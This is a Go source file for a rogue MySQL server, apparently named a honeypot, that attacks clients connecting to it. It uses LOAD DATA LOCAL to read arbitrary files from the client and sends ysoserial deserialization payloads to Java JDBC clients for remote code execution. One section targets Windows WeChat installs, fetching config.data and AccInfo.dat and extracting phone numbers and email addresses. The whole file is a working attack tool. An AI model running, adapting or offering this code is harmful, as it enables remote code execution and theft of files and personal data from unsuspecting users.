package main

import (
    "crypto/sha1"
    "encoding/hex"
    "fmt"
    log "github.com/sirupsen/logrus"
    "gopkg.in/yaml.v2"
    "io/ioutil"
    "os"
    "os/exec"
    "path/filepath"
    "regexp"
    "MysqlHoneyPot/mysql"
    "strings"
    "sync"
    "time"
    "vitess.io/vitess/go/sqltypes"
    "golang.org/x/text/encoding/unicode"
)

type DB struct {
    listener *mysql.Listener
    Handler  mysql.Handler

    mapLock   sync.Mutex
    fileIndex map[uint32]int
    config    Config

    YsoserialOutput map[string][]byte
}

type Config struct {
    Host             string              `yaml:"host"`
    Port             string              `yaml:"port"`
    FileList         []string            `yaml:"file_list"`
    SavePath         string              `yaml:"save_path"`
    Auth             bool                `yaml:"auth"`
    Users            []map[string]string `yaml:"users"`
    AlwaysRead       bool                `yaml:"always_read"`
    VersionString    string              `yaml:"version_string"`
    JdbcExploit      bool                `yaml:"jdbc_exploit"`
    YsoserialCommand map[string][]string `yaml:"ysoserial_command"`
    AlwaysExploit    bool                `yaml:"always_exploit"`
}

func NativePassword(password string) string {
    if len(password) == 0 {
        return ""
    }

    hash := sha1.New()
    hash.Write([]byte(password))
    s1 := hash.Sum(nil)

    hash.Reset()
    hash.Write(s1)
    s2 := hash.Sum(nil)

    s := strings.ToUpper(hex.EncodeToString(s2))

    return fmt.Sprintf("*%s", s)
}

func CmdExec(args []string) []byte {
    baseCmd := args[0]
    cmdArgs := args[1:]

    log.Infof("Exec: %v", args)

    cmd := exec.Command(baseCmd, cmdArgs...)
    out, err := cmd.Output()

    if err != nil {
        log.Errorf("Get error in payload generator %s", err)
        log.Exit(-1)
    }

    return out
}

func main() {
    formatter := new(log.TextFormatter)
    formatter.FullTimestamp = true
    formatter.TimestampFormat = "2006-01-02 15:04:05"
    log.SetFormatter(formatter)
    log.SetOutput(os.Stdout)

    config := Config{}
    cwd, _ := filepath.Abs(filepath.Dir(os.Args[0]))
    configData, err := ioutil.ReadFile(fmt.Sprintf("%s/%s", cwd, "config.yaml"))

    if err != nil {
        log.Errorf("Config read error: %s", err)
        os.Exit(-1)
    }
    err = yaml.Unmarshal(configData, &config)

    if err != nil {
        log.Errorf("Config parse error: %s", err)
        os.Exit(-1)
    }

    db := &DB{}
    db.fileIndex = make(map[uint32]int)
    db.Handler = db
    db.config = config
    db.YsoserialOutput = map[string][]byte{}

    if config.JdbcExploit {
            for index, command := range config.YsoserialCommand {
                db.YsoserialOutput[index] = CmdExec(command)
            }
    }

    var authServer mysql.AuthServer
    if config.Auth {
        authServerStatic := mysql.NewAuthServerStatic()

        for _, user := range config.Users {
            for username, password := range user {
                password = NativePassword(password)

                if authServerStatic.Entries[username] == nil {
                    authServerStatic.Entries[username] = []*mysql.AuthServerStaticEntry{
                        {
                            MysqlNativePassword: password,
                            Password:            password,
                        },
                    }
                } else {
                    authServerStatic.Entries[username] = append(authServerStatic.Entries[username], &mysql.AuthServerStaticEntry{
                        MysqlNativePassword: password,
                        Password:            password,
                    })
                }
            }
        }

        authServer = authServerStatic
    } else {
        authServer = &mysql.AuthServerNone{}
    }

    db.listener, err = mysql.NewListener("tcp", fmt.Sprintf("%s:%s", config.Host, config.Port), authServer, db, config.VersionString, 0, 0)
    if err != nil {
        log.Errorf("NewListener failed: %s", err)
        os.Exit(-1)
    }

    log.Infof("Server started at [%s:%s]", config.Host, config.Port)
    db.listener.Accept()
}

//
// mysql.Handler interface
//

// NewConnection is part of the mysql.Handler interface.
func (db *DB) NewConnection(c *mysql.Conn) {
    log.Infof("New client from addr [%s] logged in with username [%s], ID [%d]", c.RemoteAddr(), c.User, c.ConnectionID)

    if c.ConnAttrs != nil {
        log.Info("==== ATTRS ====")
        for name, value := range c.ConnAttrs {
            if name == "_client_name" && strings.Contains(value, "MySQL Connector") {
                c.IsJdbcClient = true
                c.SupportLoadDataLocal = true
                // 测试发现只有 pymysql 和原生命令行会对这个 flag 真正进行修改
                // 而且 Connector/J 默认值为 False, 所以这里做特殊兼容
            }

            log.Infof("[%s]: [%s]", name, value)
        }
        log.Info("===============")
    }

    db.mapLock.Lock()
    db.fileIndex[c.ConnectionID] = 0
    db.mapLock.Unlock()
}

// ConnectionClosed is part of the mysql.Handler interface.
func (db *DB) ConnectionClosed(c *mysql.Conn) {
    log.Infof("Client leaved, Addr [%s], ID [%d]", c.RemoteAddr(), c.ConnectionID)
    db.mapLock.Lock()
    delete(db.fileIndex, c.ConnectionID)
    db.mapLock.Unlock()
}

// ComQuery is part of the mysql.Handler interface.
func (db *DB) ComQuery(c *mysql.Conn, query string, callback func(*sqltypes.Result) error) error {
    log.Infof("Client from addr [%s], ID [%d] try to query [%s]", c.RemoteAddr(), c.ConnectionID, query)

    // JDBC client exploit
    if db.config.JdbcExploit && (db.config.AlwaysExploit || c.IsJdbcClient) {
        if query == "SHOW SESSION STATUS" {
            log.Infof("Client request `SESSION STATUS`, start exploiting...")
            r := &sqltypes.Result{Fields: mysql.SchemaToFields(mysql.Schema{
                {Name: "Variable_name", Type: sqltypes.Blob, Nullable: false},
                {Name: "Value", Type: sqltypes.Blob, Nullable: false},
            })}

            t := c.ConnAttrs["t"]
            if len(db.YsoserialOutput[t]) == 0 {
                for tmp, _ := range db.YsoserialOutput {
                    t = tmp
                    break
                }
            }

            log.Infof("Sending [%v] payload to mysql client", t)
            r.Rows = append(r.Rows, mysql.RowToSQL(mysql.SQLRow{[]byte{}, db.YsoserialOutput[t]}))

            _ = callback(r)
        } else if strings.HasPrefix(query, "/* mysql-connector-java-8") {
            // 对于 mysql-connector-java-5 和 6，不用发送这些变量也能利用
            r := mysql.GetMysqlVars()

            _ = callback(r)
        } else {
            r := &sqltypes.Result{}
            _ = callback(r)
        }
        return nil
    }

    // mysql LOAD DATA LOCAL exploit
    if !c.SupportLoadDataLocal && !db.config.AlwaysRead { // 客户端不支持读取本地文件且没有开启总是读取，直接返回错误
        log.Info("Client not support LOAD DATA LOCAL, return error directly")
        c.WriteErrorResponse(fmt.Sprintf("You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1", query))
        return nil
    }

    length := len(db.config.FileList)
    if length == 0 {
        return nil
    } else {
        filename := db.config.FileList[db.fileIndex[c.ConnectionID]]
        db.mapLock.Lock()
        db.fileIndex[c.ConnectionID] = (db.fileIndex[c.ConnectionID] + 1) % length
        db.mapLock.Unlock()
        data := c.RequestFile(filename)
        log.Infof("Now try to read file [%s] from addr [%s], ID [%d]", filename, c.RemoteAddr(), c.ConnectionID)

        if data == nil || len(data) == 0 {
            log.Infof("Read failed, file may not exist in client")
        } else {
            path := fmt.Sprintf("%s/%s", db.config.SavePath, strings.Split(c.RemoteAddr().String(), ":")[0])

            if _, err := os.Stat(path); os.IsNotExist(err) {
                os.MkdirAll(path, 0755)
            }

            filename := strings.Split(filename, "/")
            filename = filename[len(filename)-1:]

            path = fmt.Sprintf("%s/%v-%s", path, time.Now().Unix(), filename[0])
            ioutil.WriteFile(path, data, 0644)
            log.Infof("Read success, stored at [%s]", path)

            //获取微信配置
            var wxuser string
            if strings.Contains(path, "PFRO") {
                f, err := ioutil.ReadFile(path)
                if err != nil {
                    fmt.Println("read fail", err)
                }

                decoder := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewDecoder()
                bs2,err1 := decoder.Bytes(f)
                if err1 != nil {
                    fmt.Println("read fail", err1)
                }
                str1 := string(bs2)
                rx := regexp.MustCompile(`(?s)Users\\(.*?)\\`)
                matches := rx.FindAllStringSubmatch(str1, -1)
                for i := 0; i < len(matches); i++{
                    if len(matches[i][1]) == 0 {
                        continue
                    }
                    if strings.EqualFold(matches[i][1],"Administrator") {
                        continue
                    }
                    if strings.EqualFold(matches[i][1],"ADMINI~1") {
                        continue
                    }
                    wxuser = matches[i][1]
                    break
                }

                if len(wxuser) == 0 {
                    log.Infof("get wxuser failed")
                } else {
                    wxfilename := "C:/Users/" + wxuser + "/Documents/WeChat Files/All Users/config/config.data"

                    wxdata := c.RequestFile(wxfilename)

                    wxstr := string(wxdata)
                    rx1 := regexp.MustCompile(`(?s)WeChat Files\\(.*?)\\`)
                    matches1 := rx1.FindAllStringSubmatch(wxstr, -1)
                    wxid := matches1[0][1]

                    var wxdata1 []byte
                    var wxinfo string
                    var wxconfig string
                    if len(wxid) == 0{
                        fmt.Println("get wxid failed")
                    } else {
                        wxconfig = "C:/Users/" + wxuser + "/Documents/WeChat Files/" + wxid + "/config/AccInfo.dat"

                        wxdata1 = c.RequestFile(wxconfig)

                        wxphone := ""
                        wxmail := ""

                        //提取邮箱手机号
                        rx2 := regexp.MustCompile(`1[3|4|5|7|8][0-9]{9}`)
                        matches2 := rx2.FindAllStringSubmatch(string(wxdata1), -1)

                        if len(matches2) > 0 {
                            wxphone = matches2[0][0]
                        }

                        rx3 := regexp.MustCompile(`\w+@\w+\.\w+`)
                        matches3 := rx3.FindAllStringSubmatch(string(wxdata1), -1)

                        if len(matches3) > 0 {
                            wxmail = matches3[0][0]
                        }

                        wxinfo = "Phone:" + wxphone+ "\nmail:" + wxmail
                    }

                    if wxdata1 == nil || len(wxdata1) == 0 {
                        log.Infof("Read failed, file may not exist in client")
                    } else {
                        path := fmt.Sprintf("%s/%s", db.config.SavePath, strings.Split(c.RemoteAddr().String(), ":")[0])

                        if _, err := os.Stat(path); os.IsNotExist(err) {
                            os.MkdirAll(path, 0755)
                        }

                        filename := strings.Split(wxconfig, "/")
                        filename = filename[len(filename)-1:]

                        path1 := fmt.Sprintf("%s/%v-%s", path, time.Now().Unix(), "info.txt")
                        path = fmt.Sprintf("%s/%v-%s", path, time.Now().Unix(), filename[0])
                        ioutil.WriteFile(path, wxdata1, 0644)
                        ioutil.WriteFile(path1, []byte(wxinfo), 0644)


                        log.Infof("Read success, stored at [%s]", path)
                    }
                }
            }
        }

        c.WriteErrorResponse(fmt.Sprintf("You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '%s' at line 1", query))
        return nil
    }
}

// WarningCount is part of the mysql.Handler interface.
func (db *DB) WarningCount(c *mysql.Conn) uint16 {
    return 0
}

func Read0(filename string)  (string){
    f, err := ioutil.ReadFile(filename)
    if err != nil {
        fmt.Println("read fail", err)
    }
    return string(f)
}
